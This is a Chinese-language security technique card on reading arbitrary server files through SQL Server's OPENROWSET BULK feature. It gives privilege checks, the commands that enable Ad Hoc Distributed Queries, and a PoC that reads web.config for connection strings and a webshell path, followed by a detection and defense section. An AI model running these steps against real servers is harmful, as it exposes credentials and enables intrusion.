---
id: web-generic-sqli-mssql-openrowset-bulk-arbitrary-file-read
title: OPENROWSET(BULK ... SINGLE_CLOB) + Ad Hoc Distributed Queries：用 T-SQL 读取服务器任意文本文件确认站点路径与配置
type: scenario
domain: web
path: web/generic/sqli
technique: mssql-openrowset-bulk-file-read
aliases:
- OPENROWSET BULK SINGLE_CLOB 读文件
- Ad Hoc Distributed Queries 开启
- SQL Server 读 web.config
- T-SQL 任意文件读取
- OPENROWSET 读取服务器文件
tags:
- mssql
- sql-server
- file-read
- openrowset
- bulk
- ad-hoc-distributed-queries
- recon
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:46:31+08:00'
  notes: 已对照原文与 10 张图核对：图05 `SELECT * FROM OPENROWSET(BULK ...web.config, SINGLE_CLOB) AS FileContent` 返回 BulkColumn 为 web.config 全文，与卡内一句话结论/PoC 一致；开启语句 Ad Hoc Distributed Queries 与原文一致。已修 1 处：原边界写「受 max_allowed_packet 限制」属 MySQL 概念误植到 SQL Server，改为服务端结果集/LOB 大小与客户端缓冲限制，并注明原文未给具体阈值。未验证点：未在 MSSQL 实例复跑、大文件读取的实际阈值与 BulkColumn 截断行为未实测。
---

## 一句话结论

拥有 sysadmin 的 SQL Server 会话可以开启 `Ad Hoc Distributed Queries`，再用 `SELECT * FROM OPENROWSET(BULK '<绝对路径>', SINGLE_CLOB) AS x` 把服务器上任意文本文件按单列大对象读回结果集——由此可直接读到 `web.config`、配置文件、脚本源码，确认站点绝对路径与数据库连接串，且完全不依赖 `xp_cmdshell` 的命令执行能力。

## 原理

- **`OPENROWSET(BULK ...)` 是服务端文件读取原语**：`BULK` 选项让 SQL Server 直接从磁盘读取文件作为行集，`SINGLE_CLOB` 表示把整个文件当作单个字符大对象（`varchar(max)`/`text`）返回；读取动作发生在数据库服务进程内，权限是服务账户，与 SQL 会话的命令执行权限无关。
- **为什么需要 Ad Hoc Distributed Queries**：`OPENROWSET` 的即席查询形式默认被 `Ad Hoc Distributed Queries` 高级选项关闭（防止通过 `OPENDATASOURCE`/`OPENROWSET` 做非预期的外部数据访问），sysadmin 需先 `sp_configure 'show advanced options',1` + `RECONFIGURE`、`sp_configure 'Ad Hoc Distributed Queries',1` + `RECONFIGURE`。
- **为什么这是独立可复用原子**：它把「数据库权限 → 文件读取」这条能力单独拎出来，不依赖写文件或执行命令；在只能执行 T-SQL 的场景下（命令执行被杀软/策略拦住），它仍可读取配置与源码，用于确认落盘路径、拿数据库连接串、找其它凭据。
- **边界与限制**：`SINGLE_CLOB` 只能读文本；二进制需要 `SINGLE_BLOB`。超大文件会受服务端结果集/Lob 大小与客户端缓冲限制（原文未给出具体阈值，实践中大文件宜改用 `BULK INSERT` 落表再分段查询）；路径必须是服务账户可读的绝对路径（UNC 路径需要服务账户有网络访问权限）。读取会留痕（`OPENROWSET` 调用可被审计）。

## 触发条件

- 拥有 sysadmin（或可执行 `sp_configure` 并被授予相应权限）的 SQL Server 会话。
- `Ad Hoc Distributed Queries` 可被开启（未被策略强制锁定）。
- 已知或可枚举出目标文件的绝对路径（可先用 `xp_dirtree` 找目录）。
- SQL Server 服务账户对目标文件有读权限。
- 不要求 `xp_cmdshell` 可用、不要求能写文件。

## 利用步骤

1. 确认权限：`Select IS_SRVROLEMEMBER('sysadmin');` → 1。
2. 开启高级选项与即席查询：`EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'Ad Hoc Distributed Queries',1; RECONFIGURE;`。
3. 用 `xp_dirtree` 定位站点目录，得到 `web.config` 的绝对路径。
4. 读取文件：`SELECT * FROM OPENROWSET(BULK 'd:\<站点目录>\web.config', SINGLE_CLOB) AS FileContent;`。
5. 从返回的 `BulkColumn` 中提取站点配置、数据库连接串、应用密钥等信息，确认写马路径与后续凭据。

## PoC

```sql
-- 1) 开启即席分布式查询
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;

-- 2) 读取任意文本文件（整文件作为单列）
SELECT *
FROM OPENROWSET(
    BULK 'd:\<站点目录>\web.config',
    SINGLE_CLOB
) AS FileContent;
```

原文返回（`BulkColumn` 列即文件全文开头）：

```text
BulkColumn
<?xml version="1.0" encoding="utf-8"?><configuration> <location path...
```

若选项未开启，报错会提示 `Ad Hoc Distributed Queries` 被禁用（与 `Ole Automation Procedures` 被禁的报错形态类似，注意区分组件名）。

PoC 未在本机执行。

## 变体与关联

- **二进制读取**：把 `SINGLE_CLOB` 换成 `SINGLE_BLOB` 可读任意二进制（如编译后的 DLL、备份文件），但结果需在客户端处理。
- **不需要即席查询的替代**：`BULK INSERT` 把文件导入临时表再查询、或 `bcp`/链接服务器读取外部数据源；若 `OPENROWSET` 被禁，可用「导入到表再 SELECT」的变体。
- **只判断存在**：`xp_fileexist '<path>'` 可低噪声确认文件是否存在与是否目录；`xp_dirtree` 列目录。
- **关联**：[[web-generic-sqli-mssql-xp-dirtree-webroot-enumeration]]（先枚举目录拿到绝对路径）、[[web-generic-sqli-mssql-ole-fso-write-webshell-av-survive]]（读到 web.config 后落盘木马）、[[web-generic-sqli-mssql-backup-sp-makewebtask-webshell]]（另一类不依赖命令执行的写文件路径）。
- **边界**：`Ad Hoc Distributed Queries` 被策略锁死、服务账户无读权限、目标文件非文本（需换 `SINGLE_BLOB`）时不可用；读取大文件可能因列类型/内存限制失败，需分块或用 `BULK INSERT` 落表。

## 检测与防御

- **配置面**：`Ad Hoc Distributed Queries` 默认关闭并用策略锁定；审计 `sp_configure` 变更（会写入 ERRORLOG）。
- **权限面**：SQL Server 服务账户采用最小权限（不要用 LocalSystem，且不应能读任意业务文件）；对数据库数据目录之外的文件访问做 ACL 限制。
- **检测信号**：审计日志中出现 `OPENROWSET`、`BULK`、`sp_configure 'Ad Hoc Distributed Queries'`；同一会话出现 `IS_SRVROLEMEMBER` → `xp_dirtree` → `OPENROWSET` 的连续侦察动作；数据库进程对 Web 目录内配置文件的读取。
- **响应**：确认即席查询被开启且伴随文件读取时，按数据库高权限失陷处置，轮换连接串中的凭据并核查站点是否被写入 webshell。
